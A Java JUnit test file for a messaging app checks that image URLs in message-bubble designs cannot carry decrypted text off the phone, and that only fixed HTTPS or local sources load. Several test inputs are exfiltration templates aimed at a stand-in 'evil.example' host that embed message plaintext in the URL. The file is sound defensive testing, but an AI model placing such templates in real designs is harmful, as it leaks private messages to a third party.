package cz.m5cet.app.ui;

import static org.junit.Assert.assertEquals;

import org.json.JSONObject;
import org.junit.Test;

/** 6.7 (F-01): a design cannot carry decrypted content off the phone in an image address. */
public class DesignUrlsTest {
    private static final Expr.Translate TR = (k) -> k;

    /** The bubble's scope: a decrypted message. */
    private static Expr.Scope msg(String text) {
        JSONObject m = new JSONObject();
        try { m.put("text", text).put("photo", "data:image/png;base64,iVBORw0KGgo="); } catch (Exception e) { throw new IllegalStateException(e); }
        return n -> n.equals("msg") ? m : null;
    }

    private static String load(String raw, Expr.Scope sc) {
        return DesignUrls.image(raw, Expr.toText(Expr.value(raw, sc, TR)));
    }

    @Test
    public void aTemplatedRemoteImageIsNotFetched() {
        Expr.Scope sc = msg("the secret plaintext");
        assertEquals("", load("https://evil.example/{$msg.text}", sc));
        assertEquals("", load("https://evil.example/x.png?{$msg.text|upper}", sc));
        assertEquals("", load("=$msg.text", msg("https://evil.example/leak")));      // the data itself is a URL
        assertEquals("", load("{$msg.text}", msg("https://evil.example/leak")));
    }

    @Test
    public void localSourcesMayBeComputed() {
        Expr.Scope sc = msg("hi");
        assertEquals("data:image/png;base64,iVBORw0KGgo=", load("=$msg.photo", sc));
        assertEquals("asset:logo.png", load("asset:logo.png", sc));
        assertEquals("asset:hi", load("asset:{$msg.text}", sc));
    }

    @Test
    public void aFixedRemoteImageStays() {
        assertEquals("https://cdn.example/logo.png", load("https://cdn.example/logo.png", msg("x")));
        assertEquals("https://cdn.example/logo.png", DesignUrls.image(" https://cdn.example/logo.png ", "https://cdn.example/logo.png"));
    }

    @Test
    public void anythingElseIsRefused() {
        assertEquals("", DesignUrls.image("http://plain.example/x.png", "http://plain.example/x.png"));
        assertEquals("", DesignUrls.image("file:///sdcard/x.png", "file:///sdcard/x.png"));
        assertEquals("", DesignUrls.image("content://x/y", "content://x/y"));
        assertEquals("", DesignUrls.image(null, "https://cdn.example/a.png")); // no literal to compare with
        assertEquals("", DesignUrls.image("https://a", null));
        assertEquals("", DesignUrls.image("https://a.example/x", "https://b.example/x"));
    }
}
